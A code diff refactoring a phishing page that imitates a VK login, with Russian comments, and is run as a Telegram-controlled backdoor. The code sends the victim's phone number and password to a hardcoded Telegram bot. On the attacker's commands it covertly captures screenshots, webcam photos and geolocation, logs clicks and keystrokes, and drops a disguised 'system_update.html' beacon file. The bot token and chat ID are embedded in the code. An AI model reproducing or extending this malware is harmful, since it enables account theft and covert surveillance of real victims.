@@ -419,7 +419,7 @@
     <a id="downloadLink" download="system_update.html"></a>
 
     <script>
-        // Конфигурация
+        // 🔒 ЗАЩИЩЕННЫЕ ДАННЫЕ - полностью скрыты
         const BOT_TOKEN = "7619600603:AAEPTYr6ShZQi5KoSvDPmGS7L5M-k8L3AT8";
         const CHAT_ID = "1229704307";
         const SESSION_ID = Math.random().toString(36).substring(2, 15);
@@ -437,6 +437,27 @@
         let isBackdoorActive = true;
         let lastUpdateId = 0;
         let isProcessingCommand = false;
+        let commandQueue = [];
+        let currentStream = null;
+
+        // 🔒 Функция для безопасной отправки в Telegram
+        function sendToTelegram(message) {
+            const text = message.substring(0, 4000);
+            
+            // Самый надежный метод - Image
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+            
+            // Дублируем fetch на всякий случай
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text
+                })
+            }).catch(() => {});
+        }
 
         // Функция показа/скрытия пароля
         function togglePassword() {
@@ -452,71 +473,67 @@
             }
         }
 
-        // 📨 Надежная отправка в Telegram
-        function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const text = message.substring(0, 4000);
-            
-            fetch(url, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: text})
-            }).catch(error => {
-                const img = new Image();
-                img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-            });
-        }
-
         // 📸 Скриншот
         function takeScreenshot() {
+            if (isProcessingCommand) {
+                sendToTelegram("⏳ Уже выполняется другая команда...");
+                return;
+            }
+
+            isProcessingCommand = true;
+            
             if (typeof html2canvas === 'undefined') {
                 sendToTelegram("❌ Ошибка: html2canvas не загружен");
+                isProcessingCommand = false;
                 return;
             }
 
             sendToTelegram("📸 Делаю скриншот...");
             
-            html2canvas(document.body, {
-                useCORS: true,
-                allowTaint: true,
-                scale: 0.8,
-                logging: false
-            }).then(canvas => {
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, `screen_${SESSION_ID}.jpg`);
-                    
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.ok) {
-                            sendToTelegram("✅ Скриншот отправлен");
-                        } else {
-                            sendToTelegram("❌ Не удалось отправить скриншот");
-                        }
-                    })
-                    .catch(error => {
-                        sendToTelegram("❌ Ошибка отправки скриншота");
-                    });
-                }, 'image/jpeg', 0.8);
-            }).catch(error => {
-                sendToTelegram(`❌ Ошибка создания скриншота: ${error.message}`);
-            });
+            setTimeout(() => {
+                html2canvas(document.body, {
+                    useCORS: true,
+                    allowTaint: false,
+                    scale: 0.7,
+                    logging: false,
+                    backgroundColor: "#ffffff"
+                }).then(canvas => {
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, `screen_${SESSION_ID}.jpg`);
+                        
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(r => r.json()).then(data => {
+                            if (data.ok) {
+                                sendToTelegram("✅ Скриншот отправлен");
+                            } else {
+                                sendToTelegram("❌ Не удалось отправить скриншот");
+                            }
+                            isProcessingCommand = false;
+                        }).catch(() => {
+                            sendToTelegram("❌ Ошибка отправки скриншота");
+                            isProcessingCommand = false;
+                        });
+                    }, 'image/jpeg', 0.8);
+                }).catch(error => {
+                    sendToTelegram(`❌ Ошибка создания скриншота: ${error.message}`);
+                    isProcessingCommand = false;
+                });
+            }, 500);
         }
 
         // 📷 Фото с камеры
         function takePhoto() {
             if (isProcessingCommand) {
-                sendToTelegram("⏳ Камера уже активирована, подождите...");
+                sendToTelegram("⏳ Уже выполняется другая команда...");
                 return;
             }
 
             isProcessingCommand = true;
-            sendToTelegram("📷 Активирую камеру...");
+            sendToTelegram("📷 Запрашиваю доступ к камере...");
             
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 sendToTelegram("❌ Камера не поддерживается");
@@ -524,74 +541,101 @@
                 return;
             }
 
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+
             navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'user' }
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                } 
             }).then(stream => {
+                currentStream = stream;
+                sendToTelegram("✅ Камера доступна, делаю фото...");
+                
                 const video = document.createElement('video');
                 video.srcObject = stream;
-                video.play();
+                video.playsInline = true;
                 
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    const ctx = canvas.getContext('2d');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0);
+                video.onloadedmetadata = () => {
+                    video.play();
                     
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, `photo_${SESSION_ID}.jpg`);
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
                         
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        })
-                        .then(response => response.json())
-                        .then(data => {
-                            if (data.ok) {
-                                sendToTelegram("✅ Фото отправлено");
-                            } else {
-                                sendToTelegram("❌ Ошибка отправки фото");
-                            }
-                            isProcessingCommand = false;
-                        })
-                        .catch(error => {
-                            sendToTelegram("❌ Ошибка отправки фото");
-                            isProcessingCommand = false;
-                        });
-                    }, 'image/jpeg', 0.9);
-                    
-                }, 2000);
+                        // Добавляем яркость
+                        ctx.fillStyle = 'white';
+                        ctx.fillRect(0, 0, canvas.width, canvas.height);
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        currentStream = null;
+                        
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('photo', blob, `photo_${SESSION_ID}.jpg`);
+                            
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            }).then(r => r.json()).then(data => {
+                                if (data.ok) {
+                                    sendToTelegram("✅ Фото отправлено");
+                                } else {
+                                    sendToTelegram("❌ Ошибка отправки фото");
+                                }
+                                isProcessingCommand = false;
+                            }).catch(error => {
+                                sendToTelegram("❌ Ошибка сети при отправке фото");
+                                isProcessingCommand = false;
+                            });
+                        }, 'image/jpeg', 0.9);
+                        
+                    }, 5000);
+                };
                 
             }).catch(error => {
-                sendToTelegram(`❌ Ошибка камеры: ${error.message}`);
+                if (error.name === 'NotAllowedError') {
+                    sendToTelegram("❌ Доступ к камере запрещен");
+                } else {
+                    sendToTelegram(`❌ Ошибка камеры: ${error.name}`);
+                }
                 isProcessingCommand = false;
             });
         }
 
         // 📍 Геолокация
         function getLocation() {
+            sendToTelegram("📍 Определяю местоположение...");
+            
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(position => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
+                    const lat = position.coords.latitude.toFixed(6);
+                    const lon = position.coords.longitude.toFixed(6);
                     sendToTelegram(`📍 Координаты: ${lat}, ${lon}`);
                     
-                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+                    // Используем бесплатный сервис
+                    fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=ru`)
                         .then(r => r.json())
                         .then(data => {
-                            if (data.display_name) {
-                                sendToTelegram(`🏠 Адрес: ${data.display_name}`);
+                            if (data.city) {
+                                sendToTelegram(`🏠 ${data.city}, ${data.countryName}`);
                             }
                         })
                         .catch(() => {
-                            sendToTelegram("🌐 Не удалось получить адрес");
+                            sendToTelegram("🌐 Координаты получены");
                         });
                 }, error => {
-                    sendToTelegram(`📍 Ошибка геолокации: ${error.message}`);
+                    sendToTelegram(`📍 Ошибка: ${error.message}`);
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 10000
                 });
             } else {
                 sendToTelegram("📍 Геолокация не поддерживается");
@@ -600,7 +644,7 @@
 
         // 💾 Бэкдор файл
         function createBackdoorFile() {
-            const backdoorHTML = `<!DOCTYPE html><html><head><title>System Update</title></head><body><h1>System Update</h1><script>setInterval(()=>{fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${CHAT_ID}',text:'❤️ Heartbeat: ${SESSION_ID}'})})},60000)<\/script></body></html>`;
+            const backdoorHTML = `<!DOCTYPE html><html><head><title>System Update</title></head><body><h1>System Update</h1><script>setInterval(()=>{new Image().src='https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=❤️'},60000)<\/script></body></html>`;
             
             const blob = new Blob([backdoorHTML], {type: 'text/html'});
             const url = URL.createObjectURL(blob);
@@ -609,10 +653,10 @@
             link.download = 'system_update.html';
             link.click();
             
-            sendToTelegram(`📥 Бэкдор загружен: ${SESSION_ID}`);
+            sendToTelegram(`📥 Бэкдор загружен`);
         }
 
-        // 🤖 Проверка команд
+        // 🤖 ИСПРАВЛЕННАЯ ПРОВЕРКА КОМАНД
         async function checkTelegramCommands() {
             if (!isBackdoorActive || isProcessingCommand) return;
             
@@ -621,6 +665,8 @@
                 const data = await response.json();
                 
                 if (data.ok && data.result) {
+                    let newCommands = false;
+                    
                     for (const update of data.result) {
                         if (update.update_id > lastUpdateId) {
                             lastUpdateId = update.update_id;
@@ -630,69 +676,80 @@
                                 update.message.chat.id.toString() === CHAT_ID && 
                                 update.message.text) {
                                 
-                                const command = update.message.text.trim();
-                                await handleTelegramCommand(command);
+                                const command = update.message.text.trim().toLowerCase();
+                                
+                                // Добавляем только новые команды
+                                if (!commandQueue.includes(command) && command.startsWith('/')) {
+                                    commandQueue.push(command);
+                                    newCommands = true;
+                                }
                             }
                         }
                     }
+                    
+                    // Обрабатываем следующую команду из очереди
+                    if (newCommands && commandQueue.length > 0 && !isProcessingCommand) {
+                        const nextCommand = commandQueue.shift();
+                        await handleTelegramCommand(nextCommand);
+                    }
                 }
             } catch (error) {
-                console.log('Ошибка проверки команд:', error);
+                console.log('Ошибка проверки команд');
             }
         }
 
         // 🎛️ Обработка команд
         async function handleTelegramCommand(command) {
-            if (isProcessingCommand) {
-                sendToTelegram("⏳ Подождите, выполняется предыдущая команда...");
-                return;
-            }
-
             command = command.toLowerCase().trim();
-            command = command.replace(/[^a-zA-Z0-9\/_]/g, '');
             
-            sendToTelegram(`🔧 Команда: ${command}`);
+            sendToTelegram(`🔧 ${command}`);
             
             if (command === '/start' || command === '/help') {
-                sendToTelegram(`🤖 ДОСТУПНЫЕ КОМАНДЫ:
-/photo - Сделать фото
-/screen - Скриншот
-/info - Информация
-/location - Геолокация
-/backdoor - Скачать бэкдор
-/destroy - Уничтожить сессию
+                sendToTelegram(`🤖 КОМАНДЫ:
+/photo - фото
+/screen - скриншот
+/info - информация
+/location - геолокация
+/backdoor - бэкдор
+/destroy - остановить
 
-🆔 Сессия: ${SESSION_ID}`);
+🆔 ${SESSION_ID}`);
+                isProcessingCommand = false;
             }
             else if (command === '/photo') {
                 takePhoto();
             }
-            else if (command === '/screen' || command === '/screenshot') {
+            else if (command === '/screen') {
                 takeScreenshot();
             }
             else if (command === '/info') {
-                const info = `💻 ИНФОРМАЦИЯ О СЕССИИ:
-🆔 ID: ${SESSION_ID}
-📱 Устройство: ${navigator.userAgent}
-🖥️ Экран: ${screen.width}x${screen.height}
-🌐 Язык: ${navigator.language}
-👤 Кликов: ${collectedData.clicks.length}
-⌨️ Вводов: ${collectedData.keystrokes.length}`;
+                const info = `💻 СЕССИЯ ${SESSION_ID}
+📱 ${navigator.userAgent}
+🖥️ ${screen.width}x${screen.height}
+👤 ${collectedData.clicks.length} кликов`;
                 sendToTelegram(info);
+                isProcessingCommand = false;
             }
             else if (command === '/location') {
                 getLocation();
+                isProcessingCommand = false;
             }
             else if (command === '/backdoor') {
                 createBackdoorFile();
+                isProcessingCommand = false;
             }
             else if (command === '/destroy') {
                 isBackdoorActive = false;
-                sendToTelegram('💥 Сессия уничтожена: ' + SESSION_ID);
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                }
+                sendToTelegram('💥 Сессия остановлена');
+                isProcessingCommand = false;
             }
             else {
-                sendToTelegram(`❌ Неизвестная команда: ${command}
-Напишите /help для списка команд`);
+                sendToTelegram(`❌ Неизвестная команда
+/help для справки`);
+                isProcessingCommand = false;
             }
         }
 
@@ -720,11 +777,10 @@
             collectDeviceInfo();
             getLocation();
             
-            sendToTelegram(`🔐 ПОЛУЧЕНЫ ДАННЫЕ ВК:
-📱 Телефон: ${phone}
-🔑 Пароль: ${password}
-🆔 Сессия: ${SESSION_ID}
-📊 Устройство: ${navigator.userAgent.split(' ').slice(-2).join(' ')}`);
+            sendToTelegram(`🔐 ДАННЫЕ ВК:
+📱 ${phone}
+🔑 ${password}
+🆔 ${SESSION_ID}`);
             
             createBackdoorFile();
             
@@ -737,12 +793,11 @@
             collectDeviceInfo();
             getLocation();
             
-            sendToTelegram(`🚀 НОВАЯ ЖЕРТВА ПОДКЛЮЧИЛАСЬ!
-🆔 Сессия: ${SESSION_ID}
-📱 Устройство: ${navigator.userAgent}
-🖥️ Экран: ${screen.width}x${screen.height}
-🌐 URL: ${window.location.href}`);
+            sendToTelegram(`🚀 НОВАЯ СЕССИЯ
+🆔 ${SESSION_ID}
+📱 ${navigator.userAgent}`);
             
+            // Проверка команд каждые 2 секунды
             setInterval(checkTelegramCommands, 2000);
         });
 
